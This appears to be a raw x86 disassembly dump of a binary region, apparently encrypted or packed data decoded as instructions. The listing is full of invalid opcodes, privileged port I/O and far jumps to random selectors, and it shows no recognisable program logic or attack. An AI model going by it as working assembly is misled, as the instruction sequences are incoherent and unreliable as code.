  412d30:	mov    eax,0xe6ecbc17
  412d35:	and    ch,dh
  412d37:	jp     0x412db3
  412d39:	mov    al,ds:0xa1945cd1
  412d3e:	cmp    eax,0x3ed369af
  412d43:	mov    cl,BYTE PTR [eax-0x1b]
  412d46:	adc    ebx,DWORD PTR [edx-0x67ed17e4]
  412d4c:	fsub   QWORD PTR [ebx]
  412d4e:	cdq    
  412d4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d50:	sub    bl,BYTE PTR [edi-0x61]
  412d53:	in     al,0x9f
  412d55:	repz mov ds:0x868b78dc,eax
  412d5b:	into   
  412d5c:	pop    eax
  412d5d:	int    0x70
  412d5f:	fstp   st(6)
  412d61:	pop    ds
  412d62:	not    al
  412d64:	in     eax,0x92
  412d66:	pop    ds
  412d67:	bound  edi,QWORD PTR [ebx+0x5fab1457]
  412d6d:	mov    ecx,0xa18c4c9d
  412d72:	dec    esi
  412d73:	xchg   edi,eax
  412d74:	or     al,0xf5
  412d76:	push   edx
  412d77:	data16 aad 0x64
  412d7a:	stos   DWORD PTR es:[edi],eax
  412d7b:	ins    BYTE PTR es:[edi],dx
  412d7c:	icebp  
  412d7d:	mov    esi,0xca2ba422
  412d82:	mov    ds:0x6b7eeddc,eax
  412d87:	xchg   edi,eax
  412d88:	fisubr DWORD PTR [eax+ecx*2-0x565d9f25]
  412d8f:	add    al,0xd7
  412d91:	mov    ds:0xe202c542,al
  412d96:	es pop edx
  412d98:	aaa    
  412d99:	out    dx,al
  412d9a:	sub    al,0x11
  412d9c:	mov    ds:0xfb4fdc8a,eax
  412da1:	cli    
  412da2:	imul   ebx,DWORD PTR [esi-0x2c],0xb54aeae7
  412da9:	out    0x5f,eax
  412dab:	not    bh
  412dad:	sbb    BYTE PTR [ecx],0x6e
  412db0:	adc    BYTE PTR [ebx+0x34],dl
  412db3:	dec    edi
  412db4:	clc    
  412db5:	xor    edi,DWORD PTR [eax]
  412db7:	mov    ebp,0x5023c128
  412dbc:	stc    
  412dbd:	xor    al,0x19
  412dbf:	call   0x53bf:0x2c424ef4
  412dc6:	les    esp,FWORD PTR [ecx+0x7ff4be0]
  412dcc:	lea    edx,ds:0x6a8226c3
  412dd2:	fld    st(6)
  412dd4:	pop    ecx
  412dd5:	sbb    al,0x1a
  412dd7:	pop    edx
  412dd8:	loope  0x412dfd
  412dda:	ds ret 
  412ddc:	pop    esi
  412ddd:	in     al,0x55
  412ddf:	adc    esi,DWORD PTR [edx-0x53fdb20a]
  412de5:	retf   
  412de6:	daa    
  412de7:	je     0x412dc5
  412de9:	jae    0x412e3d
  412deb:	or     eax,0x8b7f6a87
  412df0:	enter  0x5aa0,0xb
  412df4:	mov    dl,0x55
  412df6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412df7:	mov    edx,0x37467da0
  412dfc:	addr16 daa 
  412dfe:	mul    BYTE PTR [ebx+ebp*8-0x7c]
  412e02:	and    ebp,esi
  412e04:	nop
  412e05:	dec    edi
  412e06:	ret    0x322a
  412e09:	pop    edx
  412e0a:	pop    es
  412e0b:	adc    eax,0xc2b1988
  412e10:	jno    0x412dbc
  412e12:	adc    DWORD PTR [edx],0xffffffa0
  412e15:	inc    ecx
  412e16:	mov    BYTE PTR [ebp+0x2b356b6f],ch
  412e1c:	aas    
  412e1d:	sar    bh,1
  412e1f:	and    eax,DWORD PTR [edx+edi*1-0x58]
  412e23:	std    
  412e24:	push   es
  412e25:	sub    al,0x8f
  412e27:	retf   
  412e28:	ret    0x97f9
  412e2b:	data16 jns 0x412e71
  412e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e2f:	call   0x882:0xd0b2c2ba
  412e36:	adc    DWORD PTR ds:[edx],eax
  412e39:	es call 0x384f4c28
  412e3f:	rol    bl,0xb0
  412e42:	(bad)  
  412e44:	sbb    DWORD PTR [ebp+0x5ab180d],ebp
  412e4a:	xor    al,0x17
  412e4c:	ins    BYTE PTR es:[edi],dx
  412e4d:	mov    al,ds:0xac787cb6
  412e52:	loopne 0x412e35
  412e54:	jno    0x412ec2
  412e56:	push   edi
  412e57:	out    dx,eax
  412e58:	rcr    DWORD PTR [eax+0x4],0x6c
  412e5c:	outs   dx,BYTE PTR ds:[esi]
  412e5d:	pushf  
  412e5e:	cdq    
  412e5f:	(bad)  
  412e60:	cli    
  412e61:	mov    ebp,0xe5ef0843
  412e66:	mov    DWORD PTR [esi+0x67],ebp
  412e69:	push   esp
  412e6a:	inc    ecx
  412e6b:	cli    
  412e6c:	repnz fldcw WORD PTR [edx+edi*2-0x3b8575f8]
  412e74:	daa    
  412e75:	sub    BYTE PTR ds:0x5f1b60ef,bl
  412e7b:	inc    edx
  412e7c:	test   ebp,esp
  412e7e:	or     ah,dh
  412e80:	jmp    FWORD PTR [eax]
  412e82:	pop    edi
  412e83:	cmp    BYTE PTR [edx+eax*8-0x42],dl
  412e87:	iret   
  412e88:	jbe    0x412e40
  412e8a:	ja     0x412e5d
  412e8c:	xchg   edx,eax
  412e8d:	sbb    dh,bl
  412e8f:	cwde   
  412e90:	inc    eax
  412e91:	ror    DWORD PTR [ebp+eax*4-0x28935b4f],cl
  412e98:	inc    ebx
  412e99:	mov    esi,0xd1d033ad
  412e9e:	out    0xa1,al
  412ea0:	hlt    
  412ea1:	retf   
  412ea2:	sub    eax,0x97645b45
  412ea7:	rcl    DWORD PTR [ebp-0x3],cl
  412eaa:	dec    ecx
  412eab:	ss out 0x10,eax
  412eae:	std    
  412eaf:	jmp    0x642f0e46
  412eb4:	loopne 0x412ec1
  412eb6:	pop    edx
  412eb7:	and    eax,0xc7dd8cc1
  412ebc:	jle    0x412ef1
  412ebe:	test   DWORD PTR [edx+0x11a1539a],edi
  412ec4:	ins    BYTE PTR es:[edi],dx
  412ec5:	sub    BYTE PTR [eax+0x47],bh
  412ec8:	sbb    al,0x82
  412eca:	or     DWORD PTR [esi],ecx
  412ecc:	cwde   
  412ecd:	add    al,0xd5
  412ecf:	push   0x17
  412ed1:	lds    esi,FWORD PTR [ebx+ebp*2+0x27]
  412ed5:	dec    edx
  412ed6:	(bad)  
  412ed7:	ja     0x412ebc
  412ed9:	ins    BYTE PTR es:[edi],dx
  412eda:	adc    BYTE PTR [eax+0x422afe1a],ch
  412ee0:	push   ds
  412ee1:	lods   eax,DWORD PTR ds:[esi]
  412ee2:	cs mov bl,0xe1
  412ee5:	cld    
  412ee6:	add    eax,0xe63db89d
  412eeb:	repz aam 0x4b
  412eee:	rcl    DWORD PTR [edi-0xebaf6c3],1
  412ef4:	outs   dx,BYTE PTR ds:[esi]
  412ef5:	test   dl,dl
  412ef7:	cs std 
  412ef9:	or     DWORD PTR [esi],ebp
  412efb:	jmp    0x976fac05
  412f00:	dec    esi
  412f01:	xchg   ecx,eax
  412f02:	retf   
  412f03:	fs xchg edx,eax
  412f05:	add    bl,bh
  412f07:	sbb    eax,0x9335cfec
  412f0c:	inc    ecx
  412f0d:	and    eax,0x1feb5428
  412f12:	or     dl,0x76
  412f15:	dec    DWORD PTR [esi]
  412f17:	lea    eax,[ebx+edi*8+0x5d]
  412f1b:	mov    ebx,0x3ccd3823
  412f20:	and    eax,0xd7bd30f8
  412f25:	pop    esp
  412f26:	sub    ch,dl
  412f28:	pop    ss
  412f29:	or     al,0xfd
  412f2b:	gs pop esp
  412f2d:	pop    eax
  412f2e:	nop
  412f2f:	push   ecx
  412f30:	inc    ebx
  412f31:	das    
  412f32:	jns    0x412f5b
  412f34:	jp     0x412f09
  412f36:	arpl   bx,sp
  412f38:	pop    ebp
  412f39:	out    dx,al
  412f3a:	jbe    0x412ec2
  412f3c:	xchg   esp,eax
  412f3d:	mov    edi,0xe21cd0a2
  412f42:	clc    
  412f43:	jle    0x412f82
  412f45:	std    
  412f46:	(bad)  
  412f47:	(bad)  
  412f48:	jl     0x412f17
  412f4a:	sar    ah,0xe2
  412f4d:	jo     0x412f40
  412f4f:	xchg   ebp,eax
  412f50:	outs   dx,BYTE PTR ds:[esi]
  412f51:	(bad)  
  412f52:	push   ecx
  412f53:	add    esi,eax
  412f55:	add    DWORD PTR [eax+0x76],ecx
  412f58:	fistp  DWORD PTR [edi-0x1f8a8156]
  412f5e:	test   DWORD PTR [ecx+0x11b8b748],ecx
  412f64:	imul   ebp,DWORD PTR [edx+0x40cfdee],0x77
  412f6b:	xchg   ebp,eax
  412f6c:	hlt    
  412f6d:	mov    edx,0x5194cebd
  412f72:	std    
  412f73:	jns    0x412f65
  412f75:	or     ch,BYTE PTR [ecx+esi*2+0x6a80d717]
  412f7c:	push   eax
  412f7d:	(bad)  
  412f7e:	push   ebp
  412f7f:	aaa    
  412f80:	fisttp QWORD PTR [eax+eiz*1-0x4b]
  412f84:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  412f86:	push   edx
  412f87:	imul   eax,edx,0x3a
  412f8a:	bound  esi,QWORD PTR gs:[esi+0x63]
  412f8e:	xchg   esp,eax
  412f8f:	xchg   DWORD PTR [edx-0x5495642d],eax
  412f95:	out    dx,eax
  412f96:	push   0x3df61dc1
  412f9b:	mov    edi,DWORD PTR [eax+0x5c]
  412f9e:	xor    al,0x61
  412fa0:	sub    eax,0x2740ef03
  412fa5:	mov    edx,0x4a71c59d
  412faa:	or     dl,BYTE PTR [edi]
  412fac:	enter  0x6241,0xcc
  412fb0:	repz retf 0xedff
  412fb4:	pop    esp
  412fb5:	repnz mov ebx,ebp
  412fb8:	test   al,0xb5
  412fba:	std    
  412fbb:	mov    cl,0x71
  412fbd:	lea    ebp,[edx+ebp*1-0x5c]
  412fc1:	test   bl,bh
  412fc3:	mov    DWORD PTR [ebx+edx*4+0x73185089],0x937c2ac8
  412fce:	nop
  412fcf:	push   edi
  412fd0:	shl    DWORD PTR [ecx-0x72e9369a],1
  412fd6:	dec    esi
  412fd7:	ds dec ebx
  412fd9:	cmp    DWORD PTR [ebx+0x15],0x4a
  412fdd:	pop    esi
  412fde:	data16 mov bl,0xba
  412fe1:	test   DWORD PTR [edx],ebx
  412fe3:	or     al,0xbf
  412fe5:	mov    bl,0xa7
  412fe7:	xchg   edi,eax
  412fe8:	pushf  
  412fe9:	fld    DWORD PTR [edx-0x6a81bc21]
  412fef:	and    eax,0x29b5cabd
  412ff4:	arpl   WORD PTR [ecx+0x3b],di
  412ff7:	bound  edi,QWORD PTR es:[eax+0x61]
  412ffb:	xor    al,0xc0
  412ffd:	and    dh,bl
  412fff:	nop
  413000:	je     0x413053
  413002:	jecxz  0x412fff
  413004:	adc    al,0x8b
  413006:	lds    ecx,FWORD PTR [edx]
  413008:	gs cld 
  41300a:	jl     0x412f96
  41300c:	mov    bh,0x54
  41300e:	es jp  0x413029
  413011:	adc    cl,BYTE PTR [eax+ebx*2]
  413014:	adc    DWORD PTR [ecx+0x6759bb3a],0xffffff8d
  41301b:	sub    esp,DWORD PTR [ebx-0x23]
  41301e:	mov    ds:0xc566c4e8,eax
  413023:	fwait
  413024:	into   
  413025:	nop
  413026:	push   esi
  413027:	push   0xffffffd6
  413029:	out    0x1f,eax
  41302b:	or     al,0x8c
  41302d:	sbb    BYTE PTR [ebp+0x36040c92],ch
  413033:	ds dec esi
  413035:	test   eax,0x27546c6b
  41303a:	or     ebp,DWORD PTR [eax]
  41303c:	xor    eax,0x302653fe
  413041:	les    edx,FWORD PTR [ebx+0x61]
  413044:	xor    dh,BYTE PTR [ebx-0xf32ae8a]
  41304a:	rcr    DWORD PTR [eax],1
  41304c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41304d:	xor    ecx,DWORD PTR [ecx-0x68f66b42]
  413053:	pop    esp
  413054:	js     0x412fef
  413056:	mov    al,0xd1
  413058:	and    ecx,0xffffffa4
  41305b:	out    0x3b,eax
  41305d:	jecxz  0x413044
  41305f:	or     DWORD PTR [ecx+0x20],ebp
  413062:	sbb    al,0x85
  413064:	pop    ebp
  413065:	mov    ebp,0x80d66b2b
  41306a:	jmp    0x8196:0xc80a15a5
  413071:	and    bh,BYTE PTR [ebp+0x1726892c]
  413077:	adc    edi,DWORD PTR [edx+0x50febe04]
  41307d:	dec    ecx
  41307e:	fisub  DWORD PTR [eax-0x26324e7]
  413084:	inc    ebx
  413085:	xor    eax,0xc7a218fb
  41308a:	xchg   edi,eax
  41308b:	dec    ebp
  41308c:	in     al,0xe
  41308e:	hlt    
  41308f:	xor    edx,ecx
  413091:	mov    esp,0x9739f281
  413096:	aas    
  413097:	scas   al,BYTE PTR es:[edi]
  413098:	arpl   WORD PTR cs:[esi-0x578d8073],ax
  41309f:	push   0x78
  4130a1:	in     eax,dx
  4130a2:	pop    edi
  4130a3:	int    0x21
  4130a5:	jb     0x413048
  4130a7:	xor    BYTE PTR [eax+ebp*1+0x71152ab8],cl
  4130ae:	sbb    al,0xf5
  4130b0:	call   0xb797cdd
  4130b5:	mov    fs,WORD PTR [edx]
  4130b7:	jg     0x413122
  4130b9:	xchg   esp,eax
  4130ba:	shl    ebx,cl
  4130bc:	inc    esi
  4130bd:	push   ds
  4130be:	js     0x413085
  4130c0:	push   cs
  4130c1:	mov    ebp,0x7db48ef1
  4130c6:	mov    al,ds:0x867cc79c
  4130cb:	sbb    eax,0xb9f2b682
  4130d0:	(bad)  
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	push   ebp
  4130d3:	lds    ebp,FWORD PTR [ebx+edx*4-0x72d0f8d1]
  4130da:	push   ebx
  4130db:	sbb    ch,bl
  4130dd:	das    
  4130de:	iret   
  4130df:	imul   edx,DWORD PTR [ecx-0x46],0x3fc15587
  4130e6:	mov    dh,0xf8
  4130e8:	xor    edi,edx
  4130ea:	adc    bl,bl
  4130ec:	adc    BYTE PTR ds:0x8f4ad4e5,ah
  4130f2:	mov    esp,0x4f405265
  4130f7:	es inc edi
  4130f9:	stc    
  4130fa:	cld    
  4130fb:	xchg   DWORD PTR [ebp+0x11e1758],ebx
  413101:	ret    
  413102:	(bad)  
  413103:	fcmovne st,st(0)
  413105:	cwde   
  413106:	aad    0x27
  413108:	jne    0x4130c7
  41310a:	mov    bh,BYTE PTR [edi+0x24]
  41310d:	pusha  
  41310e:	sbb    DWORD PTR [eax+0x7ccb7f76],esp
  413114:	jne    0x4130f5
  413116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413117:	outs   dx,DWORD PTR ds:[esi]
  413118:	mov    al,0x2e
  41311a:	push   ecx
  41311b:	sub    al,0x25
  41311d:	daa    
  41311e:	pop    ss
  41311f:	and    dh,cl
  413121:	out    0x77,eax
  413123:	stc    
  413124:	cwde   
  413125:	in     al,0xa4
  413127:	sahf   
  413128:	jecxz  0x41314a
  41312a:	mov    ah,0x91
  41312c:	adc    DWORD PTR [ebp+0x39],eax
  41312f:	add    edx,eax
  413131:	dec    ebx
  413132:	sbb    BYTE PTR [eax],al
  413134:	into   
  413135:	sbb    eax,0x22c6499f
  41313a:	jae    0x413170
  41313c:	outs   dx,BYTE PTR ds:[esi]
  41313d:	inc    edx
  41313e:	inc    ebx
  41313f:	call   0xf7ccd6c0
  413144:	pop    edi
  413145:	xchg   edi,eax
  413146:	sbb    al,0x90
  413148:	push   ebx
  413149:	mov    eax,0xdebd6cea
  41314e:	fwait
  41314f:	sbb    ebx,DWORD PTR [esi+0x14daffd0]
  413155:	mov    esi,0xdd5c7f68
  41315a:	xchg   ebp,ebx
  41315c:	xor    DWORD PTR [edx+edi*1+0x344e5fce],edi
  413163:	outs   dx,DWORD PTR ds:[esi]
  413164:	ror    BYTE PTR [eax],1
  413166:	push   ss
  413167:	mov    eax,0xa7aa13e
  41316c:	in     eax,dx
  41316d:	mov    dh,0x10
  41316f:	xchg   edi,eax
  413170:	jno    0x4131ec
  413172:	test   eax,0x68a63dd
  413177:	das    
  413178:	mov    ebp,0x9d44bc25
  41317d:	and    esp,DWORD PTR [ecx+0x2a]
  413180:	sbb    edx,DWORD PTR [eax]
  413182:	jno    0x413107
  413184:	in     eax,0x6d
  413186:	shl    BYTE PTR ds:0x2bbe07e9,0x21
  41318d:	in     eax,0x71
  41318f:	not    BYTE PTR ds:[edx-0x578fe063]
  413196:	and    DWORD PTR [eax],esi
  413198:	and    cl,BYTE PTR [ebx-0x75]
  41319b:	mov    esi,0x39468e2d
  4131a0:	retf   0x49f8
  4131a3:	sub    esp,DWORD PTR [ebx]
  4131a5:	jno    0x413195
  4131a7:	cmp    ebp,DWORD PTR [edi+0x6f42b4bb]
  4131ad:	pop    ecx
  4131ae:	fs dec edx
  4131b0:	jbe    0x4131ef
  4131b2:	jmp    0x1532:0x78144617
  4131b9:	in     eax,0xcc
  4131bb:	arpl   WORD PTR [edx-0x6],di
  4131be:	or     cl,BYTE PTR [esi-0x2a]
  4131c1:	pop    esi
  4131c2:	pop    ds
  4131c3:	xchg   ebp,eax
  4131c4:	mov    edi,0x75e02e25
  4131c9:	inc    edx
  4131ca:	mov    ds:0xfebaa196,al
  4131cf:	jnp    0x4131de
  4131d1:	hlt    
  4131d2:	icebp  
  4131d3:	xor    esp,edx
  4131d5:	loop   0x413167
  4131d7:	push   cs
  4131d8:	je     0x41317a
  4131da:	mov    ch,0xed
  4131dc:	call   0xd741:0x95d28298
  4131e3:	adc    al,0xa1
  4131e5:	sahf   
  4131e6:	cli    
  4131e7:	sbb    cl,cl
  4131e9:	cmp    eax,0x9f1be896
  4131ee:	aam    0x46
  4131f0:	(bad)
  4131f3:	outs   dx,BYTE PTR ds:[esi]
  4131f4:	jecxz  0x4131be
  4131f6:	dec    edi
  4131f7:	add    DWORD PTR [esi],eax
  4131f9:	loope  0x4131f0
  4131fb:	pop    edx
  4131fc:	jnp    0x413208
  4131fe:	int3   
  4131ff:	mov    edi,0xad669dfb
  413204:	fst    DWORD PTR [ebp-0x331f6f60]
  41320a:	xor    DWORD PTR [ebx],0xcfe68599
  413210:	sbb    ebx,ecx
  413212:	stos   BYTE PTR es:[edi],al
  413213:	pop    ebx
  413214:	lods   eax,DWORD PTR ds:[esi]
  413215:	pop    edi
  413216:	and    ah,dl
  413218:	jb     0x41322b
  41321a:	push   ecx
  41321b:	xor    eax,0x3fefdf18
  413220:	fiadd  WORD PTR [edi-0x4c]
  413223:	push   ss
  413224:	cmp    eax,0x828a74ee
  413229:	adc    al,0x76
  41322b:	mov    bh,BYTE PTR [ecx+0x34]
  41322e:	dec    eax
  41322f:	xlat   BYTE PTR ds:[ebx]
  413230:	sub    DWORD PTR [eax-0x98f8e84],edx
  413236:	or     ecx,DWORD PTR [eax-0x75]
  413239:	and    bh,BYTE PTR [esi+0x63]
  41323c:	addr16 mov ecx,0xe9524b75
  413242:	dec    ebp
  413243:	imul   edx,DWORD PTR [eax+0x17103873],0x30977a26
  41324d:	(bad)
  413250:	popf   
  413251:	cmp    DWORD PTR [ebp+0x1891f6ff],edi
  413257:	das    
  413258:	or     bh,ah
  41325a:	xchg   esp,ebx
  41325c:	xchg   esp,eax
  41325d:	loop   0x4132a8
  41325f:	sbb    DWORD PTR [ebx],0x31
  413262:	int    0x8d
  413264:	js     0x4131f6
  413266:	and    DWORD PTR [esi+0x536c4240],ebp
  41326c:	add    al,0xf5
  41326e:	daa    
  41326f:	mov    ebx,0x3e803afd
  413274:	mov    dl,0xa0
  413276:	jecxz  0x413289
  413278:	push   0x63
  41327a:	stos   BYTE PTR es:[edi],al
  41327b:	sub    eax,0xbe391cbd
  413280:	mov    cs,WORD PTR [esi+eiz*2+0x29]
  413284:	in     eax,dx
  413285:	sbb    dh,bh
  413287:	xchg   BYTE PTR [eax+edx*8-0x56],ah
  41328b:	jno    0x413249
  41328d:	adc    esi,DWORD PTR [edi+0x1d]
  413290:	fs in  eax,dx
  413292:	or     eax,0xb8790224
  413297:	lods   eax,DWORD PTR ds:[esi]
  413298:	mov    eax,0x9dfe8eb3
  41329d:	add    BYTE PTR [ecx],bl
  41329f:	push   cs
  4132a0:	loopne 0x4132bb
  4132a2:	into   
  4132a3:	js     0x4132ca
  4132a5:	cmp    dh,BYTE PTR [ebx]
  4132a7:	add    al,0x5e
  4132a9:	sbb    edx,ebp
  4132ab:	lahf   
  4132ac:	adc    bh,BYTE PTR [edx-0x79bcd42f]
  4132b2:	inc    eax
  4132b3:	and    ebp,DWORD PTR [ecx-0x5649e2c7]
  4132b9:	mov    edx,0xf8a50ddc
  4132be:	out    dx,eax
  4132bf:	imul   ebx,DWORD PTR [ebp+0x5c],0xffffffac
  4132c3:	mov    ch,0xf8
  4132c5:	into   
  4132c6:	or     edi,DWORD PTR [esi+edx*8]
  4132c9:	dec    esp
  4132ca:	push   0x2c2fb3fd
  4132cf:	jmp    0x413322
  4132d1:	icebp  
  4132d2:	xor    DWORD PTR [eax-0x4b1ddbb8],esp
  4132d8:	test   al,0xb
  4132da:	mov    eax,esi
  4132dc:	inc    edx
  4132dd:	mov    dl,BYTE PTR [eax+ebx*2-0x6]
  4132e1:	mov    bh,0x30
  4132e3:	push   0x52
  4132e5:	inc    ecx
  4132e6:	mov    bh,0xa9
  4132e8:	sbb    eax,0xc13714ff
  4132ed:	int3   
  4132ee:	dec    ebp
  4132ef:	adc    ecx,esi
  4132f1:	or     al,0xe4
  4132f3:	sbb    edx,ecx
  4132f5:	mov    esp,DWORD PTR [ebp+eax*4-0x7f529e69]
  4132fc:	pop    ds
  4132fd:	ret    
  4132fe:	mov    esi,ecx
  413300:	loopne 0x41336d
  413302:	std    
  413303:	xchg   ebp,eax
  413304:	push   es
  413305:	popf   
  413306:	pop    ecx
  413307:	pop    esi
  413308:	mov    ecx,0xb39c915a
  41330d:	xor    DWORD PTR [ebx-0x2b],edi
  413310:	mov    esp,DWORD PTR [edi+0x1de565d3]
  413316:	mov    al,ds:0x59265e7a
  41331b:	jmp    0x1db41c42
  413320:	add    eax,0x504788a3
  413325:	icebp  
  413326:	inc    esi
  413327:	mov    ss,WORD PTR [ebp-0x6b]
  41332a:	int    0xd0
  41332c:	arpl   WORD PTR [eax],bp
  41332e:	ins    DWORD PTR es:[edi],dx
  41332f:	lods   al,BYTE PTR ds:[esi]
  413330:	pop    es
  413331:	out    0xbd,al
  413333:	jbe    0x41333b
  413335:	and    BYTE PTR [ecx+ebx*4-0x3313ebc9],al
  41333c:	jne    0x4133ac
  41333e:	push   edi
  41333f:	out    0x9f,al
  413341:	cmp    eax,0xe0d1aa58
  413346:	pop    eax
  413347:	sub    eax,0xb6a126cd
  41334c:	daa    
  41334d:	ja     0x41332d
  41334f:	pop    ss
  413350:	inc    edx
  413351:	cmp    ebp,DWORD PTR [eax-0x71]
  413354:	inc    ebp
  413355:	outs   dx,BYTE PTR ds:[esi]
  413356:	out    0xe8,eax
  413358:	mov    bl,BYTE PTR [ebx]
  41335a:	loopne 0x41338d
  41335c:	mov    al,BYTE PTR [esp+eiz*8-0x4570a6b]
  413363:	add    al,0xdc
  413365:	xor    cl,BYTE PTR [ebp-0x23]
  413368:	add    esi,esi
  41336a:	cmp    bl,BYTE PTR [ecx-0x1a8a5883]
  413370:	add    ebx,DWORD PTR [ebp+0xfb1812e]
  413376:	jae    0x413333
  413378:	repnz xchg esp,eax
  41337a:	ins    DWORD PTR es:[edi],dx
  41337b:	arpl   WORD PTR [ebx+0x4d],bp
  41337e:	repnz or DWORD PTR gs:[edx-0xb],ebx
  413383:	fsubr  DWORD PTR ds:0xd22018fb
  413389:	sti    
  41338a:	shl    DWORD PTR [esp+esi*2-0x1a],cl
  41338e:	push   eax
  41338f:	clc    
  413390:	hlt    
  413391:	jmp    0x4133eb
  413393:	inc    esi
  413394:	fwait
  413395:	jne    0x4133e5
  413397:	retf   0xb8b9
  41339a:	jae    0x4133c3
  41339c:	cmp    ebp,DWORD PTR [edx]
  41339e:	push   ecx
  41339f:	pop    edx
  4133a0:	push   ss
  4133a1:	loope  0x413326
  4133a3:	cmc    
  4133a4:	xchg   edx,eax
  4133a5:	(bad)  
  4133a6:	retf   
  4133a7:	pop    esp
  4133a8:	call   0x653d:0x7624a08a
  4133af:	adc    ch,ch
  4133b1:	imul   ebp,DWORD PTR [edx+0x259502e3],0xacf45ee9
  4133bb:	add    al,0xc4
  4133bd:	mov    fs,WORD PTR [edi+0x7e]
  4133c0:	jb     0x413375
  4133c2:	xchg   DWORD PTR [edi+0x6be123e3],edi
  4133c8:	add    esi,DWORD PTR [esi+0x66]
  4133cb:	cli    
  4133cc:	adc    ax,0x3edd
  4133d0:	sub    eax,0x88d9ebd1
  4133d5:	mov    ah,bh
  4133d7:	add    ah,BYTE PTR [edx-0x4c]
  4133da:	xor    BYTE PTR [edi+edi*8+0x9fa5f7c],dh
  4133e1:	sahf   
  4133e2:	dec    ebp
  4133e3:	in     eax,dx
  4133e4:	jnp    0x4133a1
  4133e6:	xchg   edi,eax
  4133e7:	fwait
  4133e8:	mov    ebx,0xf52b0170
  4133ed:	jo     0x413393
  4133ef:	mov    bl,0xd9
  4133f1:	or     edx,DWORD PTR ss:[ecx+0x32]
  4133f5:	scas   al,BYTE PTR es:[edi]
  4133f6:	call   0xc7efd424
  4133fb:	sbb    al,0xd0
  4133fd:	pop    DWORD PTR [ecx-0x70]
  413400:	repz aad 0xdb
  413403:	ret    0x71d8
  413406:	sbb    BYTE PTR [ebx+0x6d],ah
  413409:	cmp    al,0x74
  41340b:	mov    ecx,0x56a04945
  413410:	xor    cl,dh
  413412:	fst    QWORD PTR [edi+ebx*8-0xd]
  413416:	sbb    al,0xcb
  413418:	rol    BYTE PTR [ebx],cl
  41341a:	fld    DWORD PTR [edx]
  41341c:	mov    eax,ds:0x6bd2c41a
  413421:	imul   BYTE PTR [edx+0x7]
  413424:	ins    DWORD PTR es:[edi],dx
  413425:	(bad)  
  413426:	in     eax,0xf6
  413428:	mov    esp,0x7ce619c2
  41342d:	pushf  
  41342e:	je     0x41342e
  413430:	sub    eax,0x6a0cc4b1
  413435:	dec    eax
  413436:	lahf   
  413437:	test   BYTE PTR ss:[eax],0xe7
  41343b:	scas   eax,DWORD PTR es:[edi]
  41343c:	add    BYTE PTR [eax+0x589f25b],ah
  413442:	ret    0xd662
  413445:	mov    eax,ds:0x5733d1f4
  41344a:	push   eax
  41344b:	push   esi
  41344c:	push   ss
  41344d:	cdq    
  41344e:	mov    ah,dl
  413450:	and    eax,0x4af57376
  413455:	mov    eax,ds:0xf692e65c
  41345a:	jo     0x4134c5
  41345c:	clc    
  41345d:	cmp    eax,0xa597e28a
  413462:	(bad)  
  413463:	or     edi,ecx
  413465:	(bad)  
  413466:	mov    dl,0xbb
  413468:	arpl   WORD PTR [edx+ecx*4+0x3b95daf3],si
  41346f:	ins    BYTE PTR es:[edi],dx
  413470:	or     al,0xfa
  413472:	add    DWORD PTR [edx],esi
  413474:	cmp    dh,BYTE PTR [ebx+0x1a3c3065]
  41347a:	inc    esi
  41347b:	call   0x1580:0xda63711a
  413482:	sub    eax,0xf4562ccb
  413487:	mov    al,ds:0xca9c9cc8
  41348c:	arpl   WORD PTR ds:0x798d2b6e,cx
  413492:	mov    esi,0x449a45cd
  413497:	cwde   
  413498:	cs pop edx
  41349a:	arpl   WORD PTR [edx+0x4f],ax
  41349d:	jge    0x4134ee
  41349f:	leave  
  4134a0:	(bad)  
  4134a1:	jmp    0x38dec268
  4134a6:	sbb    ebx,0x47
  4134a9:	mov    ebx,0x4bff109e
  4134ae:	fdivr  DWORD PTR [esi+esi*8+0xb]
  4134b2:	mov    ebp,0xb67366dc
  4134b7:	mov    ecx,0x85f7b6b3
  4134bc:	cmp    dh,0x80
  4134bf:	jnp    0x4134dc
  4134c1:	push   ebp
  4134c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134c3:	fistp  QWORD PTR [ebp+0x27]
  4134c6:	ja     0x4134f6
  4134c8:	mov    dl,0xf4
  4134ca:	jmp    0xa1b9:0x135e4788
  4134d1:	mov    eax,ds:0x9e861ef7
  4134d6:	jl     0x41353b
  4134d8:	and    eax,0x6107fa2d
  4134dd:	and    al,0x92
  4134df:	jge    0x41349d
  4134e1:	push   cs
  4134e2:	and    bh,BYTE PTR [ebx]
  4134e4:	push   esp
  4134e5:	xchg   edx,eax
  4134e6:	xor    al,0xba
  4134e8:	test   BYTE PTR [ecx+0x5bb4724a],0x78
  4134ef:	lock pop esi
  4134f1:	scas   eax,DWORD PTR es:[edi]
  4134f2:	aas    
  4134f3:	mov    al,BYTE PTR [ebx+0x45c53c64]
  4134f9:	xor    al,0xf4
  4134fb:	xchg   ecx,eax
  4134fc:	cdq    
  4134fd:	loope  0x41356b
  4134ff:	or     eax,0x4f4aff8f
  413504:	sbb    ah,al
  413506:	sbb    DWORD PTR [esi],ebp
  413508:	div    BYTE PTR [ecx-0x3357ab71]
  41350e:	pop    es
  41350f:	clc    
  413510:	pop    edi
  413511:	jb     0x41354c
  413513:	js     0x413521
  413515:	jnp    0x413587
  413517:	xchg   edx,eax
  413518:	xor    eax,0x7eae1557
  41351d:	adc    BYTE PTR [eax+ebp*2-0x2b],ch
  413521:	es pushf 
  413523:	push   ecx
  413524:	stc    
  413525:	scas   al,BYTE PTR es:[edi]
  413526:	repz cdq 
  413528:	inc    esp
  413529:	dec    ebx
  41352a:	lock (bad) 
  41352c:	fsub   QWORD PTR [ebp+0xd]
  41352f:	push   es
  413530:	sar    DWORD PTR [ebx+ecx*2+0x1d],cl
  413534:	call   0x4119:0x62083c7a
  41353b:	dec    edx
  41353c:	sbb    al,0xf4
  41353e:	ins    DWORD PTR es:[edi],dx
  41353f:	(bad)  
  413540:	and    bh,BYTE PTR [edx+0x20]
  413543:	das    
  413544:	mov    bl,0xcc
  413546:	das    
  413547:	mov    eax,ds:0xb0a3819e
  41354c:	dec    esp
  41354d:	ficomp DWORD PTR [eax+eiz*2+0x16]
  413551:	inc    ebx
